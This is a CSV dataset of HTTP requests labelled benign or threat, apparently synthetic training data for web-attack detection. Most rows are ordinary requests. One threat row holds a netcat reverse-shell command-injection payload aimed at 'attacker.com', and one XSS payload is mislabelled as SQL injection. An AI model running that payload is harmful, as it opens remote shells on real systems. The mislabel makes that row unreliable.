body,confidence,headers,id,injection_point,label,method,path,pattern,source_ip,threat_type,timestamp
name=John&email=john@example.com&message=Hello,0.0,"{""User-Agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"", ""Accept-Language"": ""en-US,en;q=0.5"", ""Accept-Encoding"": ""gzip, deflate"", ""Connection"": ""keep-alive"", ""Content-Type"": ""multipart/form-data""}",benign_57859,,benign,POST,/home,,66.187.233.193,,2025-11-24T08:17:36.987695
"{""name"": ""user_964"", ""email"": ""user852@example.com"", ""age"": 62}",0.0,"{""User-Agent"": ""Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"", ""Accept-Language"": ""en-US,en;q=0.5"", ""Accept-Encoding"": ""gzip, deflate"", ""Connection"": ""keep-alive"", ""Content-Type"": ""application/json""}",benign_71833,,benign,POST,/api/products?id=desc&q=11,,238.174.143.33,,2025-11-24T01:14:02.988818
name=John&email=john@example.com&message=Hello,0.0,"{""User-Agent"": ""Mozilla/5.0 (iPhone; CPU iPhone OS 14_7_1 like Mac OS X)"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"", ""Accept-Language"": ""en-US,en;q=0.5"", ""Accept-Encoding"": ""gzip, deflate"", ""Connection"": ""keep-alive"", ""Content-Type"": ""application/x-www-form-urlencoded""}",benign_17072,,benign,POST,/api/status?sort=date&id=qpnmlcdjpg&sort=fxrxbsgjkk,,221.225.27.238,,2025-11-24T11:46:16.982276
,0.0,"{""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"", ""Accept-Language"": ""en-US,en;q=0.5"", ""Accept-Encoding"": ""gzip, deflate"", ""Connection"": ""keep-alive""}",benign_51523,,benign,GET,/terms,,4.241.108.159,,2025-11-24T07:08:05.985289
"{""name"": ""user_198"", ""email"": ""user367@example.com"", ""age"": 55}",0.0,"{""User-Agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"", ""Accept-Language"": ""en-US,en;q=0.5"", ""Accept-Encoding"": ""gzip, deflate"", ""Connection"": ""keep-alive"", ""Content-Type"": ""application/json""}",benign_78651,,benign,PUT,/news?filter=asc,,88.246.140.102,,2025-11-24T05:23:56.988655
name=John&email=john@example.com&message=Hello,0.0,"{""User-Agent"": ""Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"", ""Accept-Language"": ""en-US,en;q=0.5"", ""Accept-Encoding"": ""gzip, deflate"", ""Connection"": ""keep-alive"", ""Content-Type"": ""application/x-www-form-urlencoded""}",benign_95412,,benign,PUT,/js/app.js,,139.94.178.105,,2025-11-24T00:25:48.982514
,0.0,"{""User-Agent"": ""Mozilla/5.0 (iPhone; CPU iPhone OS 14_7_1 like Mac OS X)"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"", ""Accept-Language"": ""en-US,en;q=0.5"", ""Accept-Encoding"": ""gzip, deflate"", ""Connection"": ""keep-alive""}",benign_68584,,benign,DELETE,/js/app.js?page=date,,97.243.239.211,,2025-11-24T05:37:16.983047
,0.0,"{""User-Agent"": ""Mozilla/5.0 (Android 11; Mobile; rv:68.0) Gecko/68.0 Firefox/88.0"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"", ""Accept-Language"": ""en-US,en;q=0.5"", ""Accept-Encoding"": ""gzip, deflate"", ""Connection"": ""keep-alive""}",benign_66553,,benign,DELETE,/news,,36.48.245.242,,2025-11-23T22:58:01.985906
"{""name"": ""user_713"", ""email"": ""user877@example.com"", ""age"": 73}",0.0,"{""User-Agent"": ""Mozilla/5.0 (Android 11; Mobile; rv:68.0) Gecko/68.0 Firefox/88.0"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"", ""Accept-Language"": ""en-US,en;q=0.5"", ""Accept-Encoding"": ""gzip, deflate"", ""Connection"": ""keep-alive"", ""Content-Type"": ""application/json""}",benign_91286,,benign,POST,/services,,117.180.187.249,,2025-11-24T04:31:27.987088
,0.0,"{""User-Agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"", ""Accept-Language"": ""en-US,en;q=0.5"", ""Accept-Encoding"": ""gzip, deflate"", ""Connection"": ""keep-alive""}",benign_68389,,benign,DELETE,/terms?page=name,,228.157.149.96,,2025-11-23T23:26:49.984042
,0.0,"{""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"", ""Accept-Language"": ""en-US,en;q=0.5"", ""Accept-Encoding"": ""gzip, deflate"", ""Connection"": ""keep-alive""}",benign_61414,,benign,GET,/js/app.js,,173.61.61.231,,2025-11-24T14:44:49.987205
,0.0,"{""User-Agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"", ""Accept-Language"": ""en-US,en;q=0.5"", ""Accept-Encoding"": ""gzip, deflate"", ""Connection"": ""keep-alive""}",benign_36737,,benign,DELETE,/home?page=11&category=wxljr&page=54,,163.33.212.76,,2025-11-23T17:55:30.986536
name=John&email=john@example.com&message=Hello,0.0,"{""User-Agent"": ""Mozilla/5.0 (Android 11; Mobile; rv:68.0) Gecko/68.0 Firefox/88.0"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"", ""Accept-Language"": ""en-US,en;q=0.5"", ""Accept-Encoding"": ""gzip, deflate"", ""Connection"": ""keep-alive"", ""Content-Type"": ""application/x-www-form-urlencoded""}",benign_19250,,benign,PUT,/news,,32.5.55.73,,2025-11-24T02:16:33.986350
"{""name"": ""user_655"", ""email"": ""user168@example.com"", ""age"": 20}",0.0,"{""User-Agent"": ""Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"", ""Accept-Language"": ""en-US,en;q=0.5"", ""Accept-Encoding"": ""gzip, deflate"", ""Connection"": ""keep-alive"", ""Content-Type"": ""application/json""}",benign_59316,,benign,PUT,/register,,123.105.24.204,,2025-11-24T02:45:03.986904
,0.0,"{""User-Agent"": ""Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"", ""Accept-Language"": ""en-US,en;q=0.5"", ""Accept-Encoding"": ""gzip, deflate"", ""Connection"": ""keep-alive""}",benign_55264,,benign,GET,/blog?id=62,,25.110.63.45,,2025-11-24T06:15:43.983628
name=John&email=john@example.com&message=Hello,0.0,"{""User-Agent"": ""Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"", ""Accept-Language"": ""en-US,en;q=0.5"", ""Accept-Encoding"": ""gzip, deflate"", ""Connection"": ""keep-alive"", ""Content-Type"": ""multipart/form-data""}",benign_66571,,benign,POST,/api/status,,138.39.112.13,,2025-11-24T04:37:34.982031
,0.0,"{""User-Agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"", ""Accept-Language"": ""en-US,en;q=0.5"", ""Accept-Encoding"": ""gzip, deflate"", ""Connection"": ""keep-alive""}",benign_32061,,benign,DELETE,/faq,,255.91.118.28,,2025-11-23T22:18:18.989127
,0.0,"{""User-Agent"": ""Mozilla/5.0 (iPhone; CPU iPhone OS 14_7_1 like Mac OS X)"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"", ""Accept-Language"": ""en-US,en;q=0.5"", ""Accept-Encoding"": ""gzip, deflate"", ""Connection"": ""keep-alive"", ""Content-Type"": ""multipart/form-data""}",benign_20595,,benign,POST,/api/products,,186.196.48.154,,2025-11-24T07:45:35.988305
,0.0,"{""User-Agent"": ""Mozilla/5.0 (Android 11; Mobile; rv:68.0) Gecko/68.0 Firefox/88.0"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"", ""Accept-Language"": ""en-US,en;q=0.5"", ""Accept-Encoding"": ""gzip, deflate"", ""Connection"": ""keep-alive""}",benign_75575,,benign,DELETE,/news,,190.238.85.122,,2025-11-24T06:02:43.982569
,0.0,"{""User-Agent"": ""Mozilla/5.0 (iPhone; CPU iPhone OS 14_7_1 like Mac OS X)"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"", ""Accept-Language"": ""en-US,en;q=0.5"", ""Accept-Encoding"": ""gzip, deflate"", ""Connection"": ""keep-alive""}",benign_45753,,benign,GET,/privacy?q=96&sort=97,,50.226.171.24,,2025-11-24T05:18:49.983983
name=John&email=john@example.com&message=Hello,0.0,"{""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"", ""Accept-Language"": ""en-US,en;q=0.5"", ""Accept-Encoding"": ""gzip, deflate"", ""Connection"": ""keep-alive"", ""Content-Type"": ""application/x-www-form-urlencoded""}",benign_12982,,benign,PUT,/contact,,49.5.103.168,,2025-11-23T21:11:44.986800
"{""name"": ""user_978"", ""email"": ""user567@example.com"", ""age"": 40}",0.0,"{""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"", ""Accept-Language"": ""en-US,en;q=0.5"", ""Accept-Encoding"": ""gzip, deflate"", ""Connection"": ""keep-alive"", ""Content-Type"": ""application/json""}",benign_24080,,benign,POST,/home,,214.253.85.66,,2025-11-24T01:42:25.983192
data=javascript%3Aalert%28%27xss%27%29,0.9102719277965547,"{""User-Agent"": ""Mozilla/5.0 (Android 11; Mobile; rv:68.0) Gecko/68.0 Firefox/88.0"", ""Accept"": ""*/*"", ""Connection"": ""close"", ""Content-Type"": ""application/x-www-form-urlencoded""}",threat_94630,body,threat,PUT,/contact,javascript:alert('xss'),225.148.69.174,sql_injection,2025-11-24T01:12:21.989441
,0.0,"{""User-Agent"": ""Mozilla/5.0 (Android 11; Mobile; rv:68.0) Gecko/68.0 Firefox/88.0"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"", ""Accept-Language"": ""en-US,en;q=0.5"", ""Accept-Encoding"": ""gzip, deflate"", ""Connection"": ""keep-alive""}",benign_19319,,benign,DELETE,/contact,,57.239.177.16,,2025-11-23T16:07:52.987620
"{""name"": ""user_351"", ""email"": ""user929@example.com"", ""age"": 61}",0.0,"{""User-Agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"", ""Accept-Language"": ""en-US,en;q=0.5"", ""Accept-Encoding"": ""gzip, deflate"", ""Connection"": ""keep-alive"", ""Content-Type"": ""application/json""}",benign_49513,,benign,POST,/services,,223.100.251.8,,2025-11-24T07:00:34.982055
,0.0,"{""User-Agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"", ""Accept-Language"": ""en-US,en;q=0.5"", ""Accept-Encoding"": ""gzip, deflate"", ""Connection"": ""keep-alive""}",benign_58258,,benign,DELETE,/blog,,215.15.109.185,,2025-11-24T05:03:32.987377
name=John&email=john@example.com&message=Hello,0.0,"{""User-Agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"", ""Accept-Language"": ""en-US,en;q=0.5"", ""Accept-Encoding"": ""gzip, deflate"", ""Connection"": ""keep-alive"", ""Content-Type"": ""multipart/form-data""}",benign_33851,,benign,POST,/images/logo.png,,254.48.13.205,,2025-11-24T09:57:31.982510
,0.0,"{""User-Agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"", ""Accept-Language"": ""en-US,en;q=0.5"", ""Accept-Encoding"": ""gzip, deflate"", ""Connection"": ""keep-alive""}",benign_20754,,benign,GET,/js/app.js,,138.194.190.71,,2025-11-24T11:32:17.986913
"{""name"": ""user_767"", ""email"": ""user130@example.com"", ""age"": 24}",0.0,"{""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"", ""Accept-Language"": ""en-US,en;q=0.5"", ""Accept-Encoding"": ""gzip, deflate"", ""Connection"": ""keep-alive"", ""Content-Type"": ""application/json""}",benign_85452,,benign,POST,/register,,68.11.232.176,,2025-11-24T04:33:20.984159
,0.0,"{""User-Agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"", ""Accept-Language"": ""en-US,en;q=0.5"", ""Accept-Encoding"": ""gzip, deflate"", ""Connection"": ""keep-alive"", ""Content-Type"": ""multipart/form-data""}",benign_48822,,benign,PUT,/settings,,7.140.169.116,,2025-11-24T08:43:25.986066
,0.0,"{""User-Agent"": ""Mozilla/5.0 (iPhone; CPU iPhone OS 14_7_1 like Mac OS X)"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"", ""Accept-Language"": ""en-US,en;q=0.5"", ""Accept-Encoding"": ""gzip, deflate"", ""Connection"": ""keep-alive"", ""Content-Type"": ""multipart/form-data""}",benign_25506,,benign,POST,/help,,204.33.145.174,,2025-11-24T04:17:50.987690
normal=data&field=value,0.9669153235786798,"{""User-Agent"": ""Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36"", ""Accept"": ""*/*"", ""Connection"": ""close"", ""Content-Type"": ""application/x-www-form-urlencoded""}",threat_94550,query,threat,PUT,/search?q=%3Bnc%20-e%20/bin/sh%20attacker.com%204444,;nc -e /bin/sh attacker.com 4444,223.36.12.192,command_injection,2025-11-24T01:00:11.989811
"{""name"": ""user_379"", ""email"": ""user898@example.com"", ""age"": 38}",0.0,"{""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"", ""Accept-Language"": ""en-US,en;q=0.5"", ""Accept-Encoding"": ""gzip, deflate"", ""Connection"": ""keep-alive"", ""Content-Type"": ""application/json""}",benign_59647,,benign,PUT,/register,,110.107.209.32,,2025-11-24T14:23:15.988300
,0.0,"{""User-Agent"": ""Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"", ""Accept-Language"": ""en-US,en;q=0.5"", ""Accept-Encoding"": ""gzip, deflate"", ""Connection"": ""keep-alive""}",benign_49023,,benign,GET,/api/orders,,18.38.101.54,,2025-11-23T22:24:11.981814
,0.0,"{""User-Agent"": ""Mozilla/5.0 (iPhone; CPU iPhone OS 14_7_1 like Mac OS X)"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"", ""Accept-Language"": ""en-US,en;q=0.5"", ""Accept-Encoding"": ""gzip, deflate"", ""Connection"": ""keep-alive""}",benign_59382,,benign,DELETE,/products?id=oeavlaxec&q=42,,238.5.39.200,,2025-11-23T19:27:47.989165
,0.0,"{""User-Agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"", ""Accept-Language"": ""en-US,en;q=0.5"", ""Accept-Encoding"": ""gzip, deflate"", ""Connection"": ""keep-alive""}",benign_83363,,benign,GET,/login,,128.5.89.140,,2025-11-24T02:56:49.986278
,0.0,"{""User-Agent"": ""Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"", ""Accept-Language"": ""en-US,en;q=0.5"", ""Accept-Encoding"": ""gzip, deflate"", ""Connection"": ""keep-alive""}",benign_87782,,benign,GET,/api/orders,,122.176.205.155,,2025-11-24T06:53:24.986447
name=John&email=john@example.com&message=Hello,0.0,"{""User-Agent"": ""Mozilla/5.0 (Android 11; Mobile; rv:68.0) Gecko/68.0 Firefox/88.0"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"", ""Accept-Language"": ""en-US,en;q=0.5"", ""Accept-Encoding"": ""gzip, deflate"", ""Connection"": ""keep-alive"", ""Content-Type"": ""application/x-www-form-urlencoded""}",benign_36119,,benign,PUT,/api/orders,,98.116.29.118,,2025-11-24T05:33:09.988397
"{""name"": ""user_431"", ""email"": ""user982@example.com"", ""age"": 26}",0.0,"{""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"", ""Accept-Language"": ""en-US,en;q=0.5"", ""Accept-Encoding"": ""gzip, deflate"", ""Connection"": ""keep-alive"", ""Content-Type"": ""application/json""}",benign_41171,,benign,POST,/api/users,,199.77.116.80,,2025-11-23T21:06:55.988916
name=John&email=john@example.com&message=Hello,0.0,"{""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"", ""Accept-Language"": ""en-US,en;q=0.5"", ""Accept-Encoding"": ""gzip, deflate"", ""Connection"": ""keep-alive"", ""Content-Type"": ""multipart/form-data""}",benign_65176,,benign,POST,/images/logo.png?limit=50&q=date,,165.94.172.126,,2025-11-23T18:44:41.988958
,0.0,"{""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"", ""Accept-Language"": ""en-US,en;q=0.5"", ""Accept-Encoding"": ""gzip, deflate"", ""Connection"": ""keep-alive""}",benign_36148,,benign,DELETE,/login?page=lxki&q=66&id=72,,47.128.122.59,,2025-11-24T05:04:22.988868
,0.0,"{""User-Agent"": ""Mozilla/5.0 (Android 11; Mobile; rv:68.0) Gecko/68.0 Firefox/88.0"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"", ""Accept-Language"": ""en-US,en;q=0.5"", ""Accept-Encoding"": ""gzip, deflate"", ""Connection"": ""keep-alive"", ""Content-Type"": ""multipart/form-data""}",benign_87573,,benign,POST,/home,,251.30.16.70,,2025-11-24T08:53:44.986144
name=John&email=john@example.com&message=Hello,0.0,"{""User-Agent"": ""Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"", ""Accept-Language"": ""en-US,en;q=0.5"", ""Accept-Encoding"": ""gzip, deflate"", ""Connection"": ""keep-alive"", ""Content-Type"": ""multipart/form-data""}",benign_23456,,benign,POST,/privacy,,5.48.243.138,,2025-11-24T12:02:21.988597
name=John&email=john@example.com&message=Hello,0.0,"{""User-Agent"": ""Mozilla/5.0 (iPhone; CPU iPhone OS 14_7_1 like Mac OS X)"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"", ""Accept-Language"": ""en-US,en;q=0.5"", ""Accept-Encoding"": ""gzip, deflate"", ""Connection"": ""keep-alive"", ""Content-Type"": ""application/x-www-form-urlencoded""}",benign_62267,,benign,POST,/register?q=hzdmucgq,,166.82.44.5,,2025-11-24T13:16:17.982263
,0.0,"{""User-Agent"": ""Mozilla/5.0 (Android 11; Mobile; rv:68.0) Gecko/68.0 Firefox/88.0"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"", ""Accept-Language"": ""en-US,en;q=0.5"", ""Accept-Encoding"": ""gzip, deflate"", ""Connection"": ""keep-alive"", ""Content-Type"": ""application/json""}",benign_93866,,benign,POST,/images/logo.png,,226.109.15.156,,2025-11-24T12:25:47.985757
,0.0,"{""User-Agent"": ""Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"", ""Accept-Language"": ""en-US,en;q=0.5"", ""Accept-Encoding"": ""gzip, deflate"", ""Connection"": ""keep-alive""}",benign_62961,,benign,GET,/contact,,62.78.117.119,,2025-11-23T16:36:02.986744
,0.0,"{""User-Agent"": ""Mozilla/5.0 (iPhone; CPU iPhone OS 14_7_1 like Mac OS X)"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"", ""Accept-Language"": ""en-US,en;q=0.5"", ""Accept-Encoding"": ""gzip, deflate"", ""Connection"": ""keep-alive""}",benign_55691,,benign,GET,/products?id=57&sort=price&limit=syjpnm,,136.36.109.64,,2025-11-23T23:36:19.985665
,0.0,"{""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"", ""Accept-Language"": ""en-US,en;q=0.5"", ""Accept-Encoding"": ""gzip, deflate"", ""Connection"": ""keep-alive"", ""Content-Type"": ""multipart/form-data""}",benign_22052,,benign,POST,/home?filter=85,,138.90.105.126,,2025-11-24T14:15:50.988011
,0.0,"{""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"", ""Accept-Language"": ""en-US,en;q=0.5"", ""Accept-Encoding"": ""gzip, deflate"", ""Connection"": ""keep-alive""}",benign_41456,,benign,GET,/api/orders,,137.217.192.36,,2025-11-24T09:32:16.982474
,0.0,"{""User-Agent"": ""Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"", ""Accept-Language"": ""en-US,en;q=0.5"", ""Accept-Encoding"": ""gzip, deflate"", ""Connection"": ""keep-alive""}",benign_75601,,benign,DELETE,/favicon.ico,,237.93.157.26,,2025-11-24T12:00:33.985709
